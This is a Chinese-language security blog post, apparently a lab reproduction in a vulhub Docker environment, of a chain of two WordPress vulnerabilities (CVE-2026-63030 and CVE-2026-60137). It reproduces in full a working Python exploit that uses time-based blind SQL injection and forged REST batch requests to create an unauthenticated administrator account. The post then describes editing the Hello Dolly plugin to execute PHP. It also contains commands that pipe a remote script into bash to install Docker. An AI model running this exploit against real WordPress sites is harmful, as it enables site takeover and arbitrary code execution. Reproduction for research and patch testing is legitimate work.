@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 【vulhub】Wordpres wp2shell未授权RCE复现 CVE-2026-63030 CVE-2026-60137</title>
+        <meta name="description" content="该漏洞可在vulhub环境通过docker compose快速复现https://github.com/vulhub/vulhub/tree/master/wordpress 漏洞信息 wp2shell 是 WordPress 核心中的一条未授权管理员创建利用链，由两个漏洞组合而成。 CVE-2026-63030 是 …">
+    <link rel="canonical" href="https://the0n3.top/posts/wp-wp2shell/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="【vulhub】Wordpres wp2shell未授权RCE复现 CVE-2026-63030 CVE-2026-60137">
+    <meta property="og:description" content="该漏洞可在vulhub环境通过docker compose快速复现https://github.com/vulhub/vulhub/tree/master/wordpress 漏洞信息 wp2shell 是 WordPress 核心中的一条未授权管理员创建利用链，由两个漏洞组合而成。 CVE-2026-63030 是 …">
+    <meta property="og:url" content="https://the0n3.top/posts/wp-wp2shell/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/wp-wp2shell/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="【vulhub】Wordpres wp2shell未授权RCE复现 CVE-2026-63030 CVE-2026-60137">
+    <meta name="twitter:description" content="该漏洞可在vulhub环境通过docker compose快速复现https://github.com/vulhub/vulhub/tree/master/wordpress 漏洞信息 wp2shell 是 WordPress 核心中的一条未授权管理员创建利用链，由两个漏洞组合而成。 CVE-2026-63030 是 …">
+        <meta name="twitter:image" content="https://the0n3.top/images/wp-wp2shell/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>【vulhub】Wordpres wp2shell未授权RCE复现 CVE-2026-63030 CVE-2026-60137</h1>
+    <p>
+        <span class="meta">发布于: 2026-07-20 23:20</span>
+    </p>
+    <div class="post-body">
+        <p>该漏洞可在vulhub环境通过docker compose快速复现<a href="https://github.com/vulhub/vulhub/tree/master/wordpress">https://github.com/vulhub/vulhub/tree/master/wordpress</a></p>
+<h2>漏洞信息</h2>
+<p>wp2shell 是 WordPress 核心中的一条未授权管理员创建利用链，由两个漏洞组合而成。</p>
+<p>CVE-2026-63030 是 WP_REST_Server::serve_batch_request_v1() 中的路由混淆漏洞。当某个批量子请求无法解析时，其错误对象会被写入 $validation 数组，但 $matches 数组中没有与之对应的条目。两个数组因此发生下标错位，使后续子请求可能使用另一个请求所匹配的路由和处理器执行。</p>
+<p>CVE-2026-60137 是 WP_Query 中的 SQL 注入漏洞。<code>author__not_in</code> 参数只有在以数组形式传入时才会被转换为整数；如果传入字符串，该值便可能被直接拼接进 post_author NOT IN (...) 子句。攻击者可以在一个 REST API 批量请求中嵌套另一个批量请求，并提交 GET <code>/wp/v2/categories?author_exclude=</code><sql>。分类接口没有注册 <code>author_exclude</code> 参数，因此该值能够原样通过校验；路由混淆随后使这个请求由文章接口的 get_items() 处理器执行。该处理器会把 <code>author_exclude</code> 映射到存在漏洞的 <code>author__not_in</code> 查询变量，从而形成未授权盲注 SQL 注入。</sql></p>
+<p>此环境中的漏洞利用方式将 SQL 注入升级为通过 WordPress 文章对象缓存和自定义程序变更集工作流程创建未经授权的管理员。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/vulhub/vulhub/blob/master/wordpress/CVE-2026-63030/README.zh-cn.md">vulhub WordPress REST API 批量路由混淆与 SQL 注入导致的未授权 RCE（wp2shell，CVE-2026-63030 / CVE-2026-60137）</a></li>
+</ul>
+<p>影响版本</p>
+<ul>
+<li>6.8.0 &lt;= WordPress &lt;= 6.8.5 (仅受 CVE-2026-60137 漏洞影响)</li>
+<li>6.9.0 &lt;= WordPress &lt;= 6.9.4</li>
+<li>7.0.0 &lt;= WordPress &lt;= 7.0.1</li>
+</ul>
+<h2>快速复现</h2>
+<p>通过docker compose快速复现环境，依赖docker compose和docker，确保已安装docker和docker compose。</p>
+<p>Docker 安装与换源</p>
+<pre><code class="language-bash">bash &lt;(curl -sSL https://linuxmirrors.cn/docker.sh)</code></pre>
+<p>Docker 更换镜像加速器</p>
+<pre><code class="language-bash">bash &lt;(curl -sSL https://linuxmirrors.cn/docker.sh) --only-registry</code></pre>
+<p>准备docker-compose.yml文件<a href="https://github.com/vulhub/vulhub/blob/master/wordpress/CVE-2026-63030/docker-compose.yml">https://github.com/vulhub/vulhub/blob/master/wordpress/CVE-2026-63030/docker-compose.yml</a></p>
+<pre><code class="language-bash">cat &lt;&lt; 'EOF' &gt; docker-compose.yml
+services:
+  web:
+    image: vulhub/wordpress:6.9.4
+    depends_on:
+      - db
+    environment:
+      WORDPRESS_DB_HOST: db
+      WORDPRESS_DB_USER: root
+      WORDPRESS_DB_PASSWORD: root
+      WORDPRESS_DB_NAME: wordpress
+      WORDPRESS_CONFIG_EXTRA: |
+        define( 'AUTOMATIC_UPDATER_DISABLED', true );
+        define( 'WP_AUTO_UPDATE_CORE', false );
+    ports:
+      - "8080:80"
+  db:
+    image: mysql:8.0
+    environment:
+      - MYSQL_ROOT_PASSWORD=root
+      - MYSQL_DATABASE=wordpress
+EOF</code></pre>
+<p>执行以下命令启动 WordPress 6.9.4：</p>
+<pre><code class="language-bash">docker compose up -d</code></pre>
+<p><img src="/images/wp-wp2shell/1.png" alt="" decoding="async" width="1913" height="621"></p>
+<p>使用vulhub项目提供的poc验证<a href="https://github.com/vulhub/vulhub/blob/master/wordpress/CVE-2026-63030/poc.py">https://github.com/vulhub/vulhub/blob/master/wordpress/CVE-2026-63030/poc.py</a></p>
+<p>准备poc.py文件</p>
+<pre><code class="language-bash">cat &lt;&lt; 'EOF' &gt; poc.py
+#!/usr/bin/env python3
+"""Reproduce the WordPress wp2shell administrator-creation chain.
+
+This proof-of-concept combines the REST API batch route confusion
+(CVE-2026-63030) with the WP_Query ``author__not_in`` SQL injection
+(CVE-2026-60137). It deliberately stops after creating and verifying a new
+administrator account. It does not log in to wp-admin, upload plugins, or
+execute operating system commands.
+
+The technique was first published by sergiointel:
+https://github.com/sergiointel/wp2shell-poc
+
+For educational use and authorized testing only.
+"""
+
+import argparse
+import hashlib
+import json
+import re
+import secrets
+import statistics
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+import uuid
+from typing import Any, Dict, List, Optional, Sequence, Tuple
+
+
+DEFAULT_DELAY = 0.4
+DEFAULT_TIMEOUT = 30.0
+MAX_INTEGER = (1 &lt;&lt; 63) - 1
+USER_AGENT = "Vulhub-wp2shell-PoC/1.0"
+
+
+class ExploitError(RuntimeError):
+    """Raised when the target cannot complete the expected exploit step."""
+
+
+def info(message: str) -&gt; None:
+    """Print a progress message."""
+    print(f"[*] {message}", flush=True)
+
+
+def success(message: str) -&gt; None:
+    """Print a successful result."""
+    print(f"[+] {message}", flush=True)
+
+
+def positive_float(value: str) -&gt; float:
+    """Parse a positive floating-point command-line value."""
+    try:
+        number = float(value)
+    except ValueError as exc:
+        raise argparse.ArgumentTypeError(f"invalid number: {value}") from exc
+    if number &lt;= 0:
+        raise argparse.ArgumentTypeError("value must be greater than zero")
+    return number
+
+
+def target_url(value: str) -&gt; str:
+    """Validate and normalize an HTTP(S) target URL."""
+    parsed = urllib.parse.urlsplit(value)
+    if parsed.scheme not in ("http", "https") or not parsed.netloc:
+        raise argparse.ArgumentTypeError(
+            "target must be an absolute HTTP(S) URL, for example http://127.0.0.1:8080"
+        )
+    if parsed.query or parsed.fragment:
+        raise argparse.ArgumentTypeError("target must not contain a query string or fragment")
+
+    path = parsed.path.rstrip("/")
+    return urllib.parse.urlunsplit((parsed.scheme, parsed.netloc, path, "", ""))
+
+
+def build_parser() -&gt; argparse.ArgumentParser:
+    """Build the command-line interface."""
+    parser = argparse.ArgumentParser(
+        description=(
+            "Reproduce CVE-2026-63030 and CVE-2026-60137 by creating a new "
+            "WordPress administrator account without authentication."
+        ),
+        epilog=(
+            "examples:\n"
+            "  %(prog)s http://127.0.0.1:8080\n"
+            "  %(prog)s http://127.0.0.1:8080 --check\n"
+            "  %(prog)s http://127.0.0.1:8080 --username researcher "
+            "--email researcher@example.com"
+        ),
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("target", type=target_url, help="base URL of the WordPress site")
+    parser.add_argument(
+        "-c",
+        "--check",
+        action="store_true",
+        help="check the blind SQL injection only; do not create an account",
+    )
+
+    account = parser.add_argument_group("administrator account")
+    account.add_argument(
+        "--username",
+        metavar="NAME",
+        help="username to create (default: w2s_&lt;random&gt;)",
+    )
+    account.add_argument(
+        "--password",
+        metavar="PASSWORD",
+        help="password for the new account (default: randomly generated)",
+    )
+    account.add_argument(
+        "--email",
+        metavar="ADDRESS",
+        help="email for the new account (default: &lt;username&gt;@wp2shell.local)",
+    )
+
+    tuning = parser.add_argument_group("timing and network")
+    tuning.add_argument(
+        "--delay",
+        type=positive_float,
+        default=DEFAULT_DELAY,
+        metavar="SECONDS",
+        help=f"initial SQL sleep delay (default: {DEFAULT_DELAY})",
+    )
+    tuning.add_argument(
+        "--timeout",
+        type=positive_float,
+        default=DEFAULT_TIMEOUT,
+        metavar="SECONDS",
+        help=f"HTTP request timeout (default: {DEFAULT_TIMEOUT:g})",
+    )
+    return parser
+
+
+def sql_hex(value: str) -&gt; str:
+    """Encode a string as a MySQL hexadecimal literal."""
+    return f"0x{value.encode().hex()}" if value else "''"
+
+
+def post_row(
+    post_id: int,
+    content: str,
+    title: str,
+    status: str,
+    name: str,
+    parent: int,
+    post_type: str,
+) -&gt; str:
+    """Build one forged ``wp_posts`` row for a UNION SELECT."""
+    timestamp = sql_hex("2020-01-01 00:00:00")
+    return ",".join(
+        (
+            str(post_id),
+            "1",
+            timestamp,
+            timestamp,
+            sql_hex(content),
+            sql_hex(title),
+            "''",
+            sql_hex(status),
+            sql_hex("closed"),
+            sql_hex("closed"),
+            "''",
+            sql_hex(name),
+            "''",
+            "''",
+            timestamp,
+            timestamp,
+            "''",
+            str(parent),
+            "''",
+            "0",
+            sql_hex(post_type),
+            "''",
+            "0",
+        )
+    )
+
+
+class Wp2ShellExploit:
+    """Implement the timing oracle and administrator-creation chain."""
+
+    def __init__(self, base_url: str, delay: float, timeout: float) -&gt; None:
+        self.base_url = base_url
+        self.batch_url = f"{base_url}/?rest_route=/batch/v1"
+        self.sleep_delay = delay
+        self.timeout = timeout
+        self.threshold: Optional[float] = None
+        self.retry_band: Optional[float] = None
+
+    def request(self, url: str) -&gt; bytes:
+        """Send a GET request and return its response body."""
+        request = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
+        with urllib.request.urlopen(request, timeout=self.timeout) as response:
+            return response.read()
+
+    def send_batch(self, inner_requests: Sequence[Dict[str, Any]]) -&gt; bytes:
+        """Wrap sub-requests in the nested batch that triggers route confusion.
+
+        The first outer sub-request cannot be parsed. WordPress records its
+        validation error without adding the corresponding route match, shifting
+        the internal arrays out of alignment. The next sub-request is therefore
+        executed under the batch handler and supplies the attacker-controlled
+        inner request list.
+        """
+        payload = {
+            "requests": [
+                {"method": "POST", "path": "http://:"},
+                {
+                    "method": "POST",
+                    "path": "/wp/v2/posts",
+                    "body": {"requests": inner_requests},
+                },
+                {"method": "POST", "path": "/batch/v1"},
+            ]
+        }
+        request = urllib.request.Request(
+            self.batch_url,
+            data=json.dumps(payload).encode(),
+            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
+            method="POST",
+        )
+        with urllib.request.urlopen(request, timeout=self.timeout) as response:
+            return response.read()
+
+    def probe_time(self, condition: str) -&gt; float:
+        """Measure a boolean condition using the time-based SQLi oracle."""
+        query = f"SELECT IF(({condition}),SLEEP({self.sleep_delay}),0)"
+        started = time.perf_counter()
+        self.send_batch(
+            [
+                {"method": "GET", "path": "http://:"},
+                {
+                    "method": "GET",
+                    "path": "/wp/v2/categories?"
+                    + urllib.parse.urlencode({"author_exclude": query}),
+                },
+                {"method": "GET", "path": "/wp/v2/posts"},
+            ]
+        )
+        return time.perf_counter() - started
+
+    def calibrate(self) -&gt; Tuple[float, float]:
+        """Calibrate the timing oracle and confirm that the target is vulnerable."""
+        for _ in range(3):
+            fast_samples = [self.probe_time("1=0") for _ in range(5)]
+            slow_samples = [self.probe_time("1=1") for _ in range(3)]
+            fast = statistics.median(fast_samples)
+            slow = statistics.median(slow_samples)
+            jitter = statistics.median(
+                abs(sample - fast) for sample in fast_samples
+            )
+            if slow - fast &gt; max(0.06, jitter * 8):
+                self.threshold = (fast + slow) / 2
+                self.retry_band = max(0.02, jitter * 3)
+                return fast, slow
+            self.sleep_delay *= 2
+
+        raise ExploitError("target does not appear to be vulnerable")
+
+    def condition_is_true(self, condition: str) -&gt; bool:
+        """Evaluate a boolean SQL condition, retrying measurements near the threshold."""
+        if self.threshold is None or self.retry_band is None:
+            raise ExploitError("timing oracle has not been calibrated")
+
+        elapsed = self.probe_time(condition)
+        if abs(elapsed - self.threshold) &gt; self.retry_band:
+            return elapsed &gt; self.threshold
+        samples = [elapsed, self.probe_time(condition), self.probe_time(condition)]
+        return statistics.median(samples) &gt; self.threshold
+
+    def get_scalar(self, query: str, max_length: int) -&gt; str:
+        """Extract a printable string through binary-searched blind SQL injection."""
+        expression = f"COALESCE(({query}),'')"
+        lower, upper = 0, max_length
+        while lower &lt; upper:
+            middle = (lower + upper + 1) // 2
+            if self.condition_is_true(
+                f"CHAR_LENGTH({expression}) &gt;= {middle}"
+            ):
+                lower = middle
+            else:
+                upper = middle - 1
+
+        result = []
+        for position in range(1, lower + 1):
+            low, high = 32, 126
+            while low &lt; high:
+                middle = (low + high + 1) // 2
+                condition = (
+                    f"ASCII(SUBSTRING({expression},{position},1)) &gt;= {middle}"
+                )
+                if self.condition_is_true(condition):
+                    low = middle
+                else:
+                    high = middle - 1
+            result.append(chr(low))
+        return "".join(result)
+
+    def get_integer(self, query: str) -&gt; int:
+        """Extract a non-negative integer through blind SQL injection."""
+        expression = f"COALESCE(({query}),0)"
+        lower, upper = 0, 1
+        while self.condition_is_true(f"{expression} &gt;= {upper}"):
+            lower = upper
+            if upper &gt;= MAX_INTEGER:
+                raise ExploitError("integer extraction exceeded the supported range")
+            upper = min(upper * 2, MAX_INTEGER)
+
+        while lower &lt; upper:
+            middle = (lower + upper + 1) // 2
+            if self.condition_is_true(f"{expression} &gt;= {middle}"):
+                lower = middle
+            else:
+                upper = middle - 1
+        return lower
+
+    def public_post_link(self) -&gt; str:
+        """Return the link of one published post used to seed oEmbed entries."""
+        url = f"{self.base_url}/?rest_route=/wp/v2/posts&amp;per_page=1&amp;_fields=link"
+        items = json.loads(self.request(url))
+        if (
+            not isinstance(items, list)
+            or not items
+            or not isinstance(items[0], dict)
+            or not items[0].get("link")
+        ):
+            raise ExploitError(
+                "no public post found; complete the WordPress installation first"
+            )
+        return str(items[0]["link"])
+
+    def seed_oembed_posts(self, public_post_link: str) -&gt; Tuple[str, List[str]]:
+        """Create three real oEmbed cache posts and return their source URLs."""
+        token = secrets.token_hex(6)
+        public_post = urllib.parse.urlsplit(public_post_link)
+        embed_urls = [
+            urllib.parse.urlunsplit(
+                (
+                    public_post.scheme,
+                    public_post.netloc,
+                    public_post.path,
+                    public_post.query,
+                    f"{token}{index}",
+                )
+            )
+            for index in range(3)
+        ]
+        seed_content = "".join(
+            f'[embed width="500" height="750"]{url}[/embed]'
+            for url in embed_urls
+        )
+        seed_query = (
+            "1) AND 1=0 UNION ALL SELECT "
+            + post_row(0, seed_content, "seed", "publish", "seed", 0, "post")
+            + " -- -"
+        )
+        self.send_batch(
+            [
+                {"method": "GET", "path": "http://:"},
+                {
+                    "method": "GET",
+                    "path": "/wp/v2/widgets?"
+                    + urllib.parse.urlencode(
+                        {
+                            "author_exclude": seed_query,
+                            "per_page": -1,
+                            "orderby": "none",
+                            "context": "view",
+                        }
+                    ),
+                },
+                {"method": "GET", "path": "/wp/v2/posts"},
+            ]
+        )
+        return token, embed_urls
+
+    def recover_database_context(self) -&gt; Tuple[str, str, int]:
+        """Recover the posts table, table prefix, and an administrator user ID."""
+        posts_table = self.get_scalar(
+            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
+            "WHERE TABLE_SCHEMA=DATABASE() "
+            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
+            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
+            64,
+        )
+        if not re.fullmatch(r"[A-Za-z0-9_$]+_posts", posts_table):
+            raise ExploitError("could not recover a valid WordPress posts table")
+
+        table_prefix = posts_table[:-5]
+        administrator_id = self.get_integer(
+            f"SELECT u.ID FROM `{table_prefix}users` u "
+            f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
+            f"WHERE m.meta_key={sql_hex(table_prefix + 'capabilities')} "
+            "AND INSTR(m.meta_value,"
+            + sql_hex('s:13:"administrator";b:1;')
+            + ")&gt;0 ORDER BY u.ID LIMIT 1"
+        )
+        if administrator_id &lt; 1:
+            raise ExploitError("could not locate an existing administrator")
+        return posts_table, table_prefix, administrator_id
+
+    def recover_cache_post_ids(
+        self, posts_table: str, embed_urls: Sequence[str]
+    ) -&gt; List[int]:
+        """Recover the database IDs of the newly created oEmbed cache posts."""
+        embed_size = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
+        cache_post_ids = []
+        for embed_url in embed_urls:
+            cache_key = hashlib.md5((embed_url + embed_size).encode()).hexdigest()
+            post_id = self.get_integer(
+                f"SELECT ID FROM `{posts_table}` "
+                "WHERE post_type=0x6f656d6265645f6361636865 "
+                f"AND post_name=0x{cache_key.encode().hex()} "
+                "ORDER BY ID DESC LIMIT 1"
+            )
+            if post_id &lt; 1:
+                raise ExploitError("could not recover an oEmbed cache post ID")
+            cache_post_ids.append(post_id)
+
+        if len(cache_post_ids) != 3 or len(set(cache_post_ids)) != 3:
+            raise ExploitError("oEmbed cache seeding did not create three unique posts")
+        return cache_post_ids
+
+    def create_administrator(
+        self,
+        administrator_id: int,
+        cache_post_ids: Sequence[int],
+        embed_urls: Sequence[str],
+        username: str,
+        password: str,
+        email: str,
+    ) -&gt; None:
+        """Publish a forged changeset and create a new administrator account."""
+        outer_loop_id = 1_800_000_000 + secrets.randbelow(100_000_000)
+        nav_item_id = outer_loop_id + 1
+        inner_loop_id = outer_loop_id + 2
+
+        changeset = json.dumps(
+            {
+                f"nav_menu_item[{nav_item_id}]": {
+                    "value": {
+                        "object_id": 0,
+                        "object": "",
+                        "menu_item_parent": 0,
+                        "position": 0,
+                        "type": "custom",
+                        "title": "proof",
+                        "url": "https://github.com/vulhub/vulhub",
+                        "target": "",
+                        "attr_title": "",
+                        "description": "proof",
+                        "classes": "",
+                        "xfn": "",
+                        "status": "publish",
+                        "nav_menu_term_id": 0,
+                        "_invalid": False,
+                    },
+                    "type": "nav_menu_item",
+                    "user_id": administrator_id,
+                }
+            },
+            separators=(",", ":"),
+        )
+
+        poisoned_posts = (
+            post_row(
+                0,
+                f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
+                "trigger",
+                "publish",
+                "trigger",
+                0,
+                "post",
+            ),
+            post_row(
+                cache_post_ids[0],
+                changeset,
+                "changeset",
+                "future",
+                str(uuid.uuid4()),
+                outer_loop_id,
+                "customize_changeset",
+            ),
+            post_row(
+                outer_loop_id,
+                "outer",
+                "outer",
+                "draft",
+                "outer",
+                cache_post_ids[0],
+                "post",
+            ),
+            post_row(
+                cache_post_ids[1],
+                "",
+                "cache",
+                "publish",
+                "cache",
+                cache_post_ids[0],
+                "post",
+            ),
+            post_row(
+                nav_item_id,
+                "nav",
+                "nav",
+                "publish",
+                "nav",
+                cache_post_ids[2],
+                "nav_menu_item",
+            ),
+            post_row(
+                cache_post_ids[2],
+                "parse",
+                "parse",
+                "parse",
+                "parse",
+                inner_loop_id,
+                "request",
+            ),
+            post_row(
+                inner_loop_id,
+                "inner",
+                "inner",
+                "draft",
+                "inner",
+                cache_post_ids[2],
+                "post",
+            ),
+        )
+        escalation_query = (
+            "1) AND 1=0 UNION ALL SELECT "
+            + " UNION ALL SELECT ".join(poisoned_posts)
+            + " -- -"
+        )
+        new_administrator = {
+            "username": username,
+            "email": email,
+            "password": password,
+            "roles": ["administrator"],
+        }
+
+        self.send_batch(
+            [
+                {"method": "GET", "path": "http://:"},
+                {
+                    "method": "GET",
+                    "path": "/wp/v2/widgets?"
+                    + urllib.parse.urlencode(
+                        {
+                            "author_exclude": escalation_query,
+                            "per_page": -1,
+                            "orderby": "none",
+                            "context": "view",
+                        }
+                    ),
+                },
+                {"method": "GET", "path": "/wp/v2/posts"},
+                {
+                    "method": "POST",
+                    "path": "/wp/v2/users",
+                    "body": new_administrator,
+                },
+                {
+                    "method": "POST",
+                    "path": "/wp/v2/users",
+                    "body": new_administrator,
+                },
+            ]
+        )
+
+    def administrator_exists(self, table_prefix: str, username: str) -&gt; bool:
+        """Verify that the user exists and has the administrator role."""
+        condition = (
+            f"EXISTS(SELECT 1 FROM `{table_prefix}users` u "
+            f"JOIN `{table_prefix}usermeta` m ON m.user_id=u.ID "
+            f"WHERE u.user_login={sql_hex(username)} "
+            f"AND m.meta_key={sql_hex(table_prefix + 'capabilities')} "
+            "AND INSTR(m.meta_value,"
+            + sql_hex('s:13:"administrator";b:1;')
+            + ")&gt;0)"
+        )
+        return self.condition_is_true(condition)
+
+
+def validate_account_options(
+    parser: argparse.ArgumentParser, args: argparse.Namespace
+) -&gt; None:
+    """Reject contradictory or empty account-related options."""
+    supplied = (args.username, args.password, args.email)
+    if args.check and any(value is not None for value in supplied):
+        parser.error("account options cannot be used together with --check")
+    for option, value in (
+        ("--username", args.username),
+        ("--password", args.password),
+        ("--email", args.email),
+    ):
+        if value is not None and not value:
+            parser.error(f"{option} cannot be empty")
+
+
+def run(args: argparse.Namespace) -&gt; None:
+    """Run vulnerability detection and, unless requested otherwise, exploitation."""
+    exploit = Wp2ShellExploit(args.target, args.delay, args.timeout)
+
+    info(f"Target: {args.target}")
+    info("Calibrating the time-based SQL injection oracle")
+    fast, slow = exploit.calibrate()
+    success(
+        "Target is vulnerable "
+        f"(baseline: {fast:.3f}s, delayed: {slow:.3f}s, SQL delay: {exploit.sleep_delay:g}s)"
+    )
+    if args.check:
+        info("Check-only mode selected; no administrator account was created")
+        return
+
+    info("Seeding three database-backed oEmbed cache posts")
+    public_post = exploit.public_post_link()
+    token, embed_urls = exploit.seed_oembed_posts(public_post)
+
+    info("Extracting the WordPress table prefix and an administrator user ID")
+    posts_table, table_prefix, administrator_id = exploit.recover_database_context()
+    success(f"Posts table: {posts_table}")
+    success(f"Existing administrator ID: {administrator_id}")
+
+    info("Recovering the oEmbed cache post IDs")
+    cache_post_ids = exploit.recover_cache_post_ids(posts_table, embed_urls)
+    success("oEmbed cache post IDs: " + ", ".join(map(str, cache_post_ids)))
+
+    username = args.username or f"w2s_{token}"
+    password = args.password or f"W2s!{secrets.token_urlsafe(15)}"
+    email = args.email or f"{username}@wp2shell.local"
+
+    info("Publishing the forged changeset and creating the administrator")
+    exploit.create_administrator(
+        administrator_id,
+        cache_post_ids,
+        embed_urls,
+        username,
+        password,
+        email,
+    )
+
+    info("Verifying the new account through blind SQL injection")
+    if not exploit.administrator_exists(table_prefix, username):
+        raise ExploitError("the administrator account could not be verified")
+
+    success("Administrator account created and verified")
+    print(f"    Username: {username}")
+    print(f"    Password: {password}")
+    print(f"    Email:    {email}")
+
+
+def main(argv: Optional[Sequence[str]] = None) -&gt; int:
+    """Parse command-line arguments and return a process exit code."""
+    parser = build_parser()
+    args = parser.parse_args(argv)
+    validate_account_options(parser, args)
+
+    try:
+        run(args)
+    except KeyboardInterrupt:
+        print("\n[-] Interrupted by user", file=sys.stderr)
+        return 130
+    except (ExploitError, json.JSONDecodeError) as exc:
+        print(f"[-] {exc}", file=sys.stderr)
+        return 1
+    except urllib.error.HTTPError as exc:
+        print(f"[-] HTTP request failed: {exc.code} {exc.reason}", file=sys.stderr)
+        return 1
+    except urllib.error.URLError as exc:
+        print(f"[-] Network request failed: {exc.reason}", file=sys.stderr)
+        return 1
+    except TimeoutError:
+        print("[-] Network request timed out", file=sys.stderr)
+        return 1
+
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+EOF</code></pre>
+<p>使用<code>--check</code>参数可以只验证是否存在sql盲注漏洞</p>
+<pre><code class="language-bash">python poc.py http://192.168.1.4:8080 --check</code></pre>
+<p><img src="/images/wp-wp2shell/2.png" alt="" decoding="async" loading="lazy" width="1045" height="461"></p>
+<p>创建管理员账号</p>
+<pre><code class="language-bash">python poc.py http://192.168.1.4:8080</code></pre>
+<p><img src="/images/wp-wp2shell/3.png" alt="" decoding="async" loading="lazy" width="1209" height="839"></p>
+<p>使用该账号可以成功登录，并且是管理员权限</p>
+<p><img src="/images/wp-wp2shell/4.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>
+<p>可以修改wordpress自带的<code>hello dolly</code>插件，执行任意命令</p>
+<p><img src="/images/wp-wp2shell/5.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>
+<p>在插件源码中添加php代码后， 启用该插件，访问插件页面即可执行php代码</p>
+<p><img src="/images/wp-wp2shell/6.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>
+<p><img src="/images/wp-wp2shell/7.png" alt="" decoding="async" loading="lazy" width="1920" height="879"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>WordPress</span>
+                            </span>
+                    </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
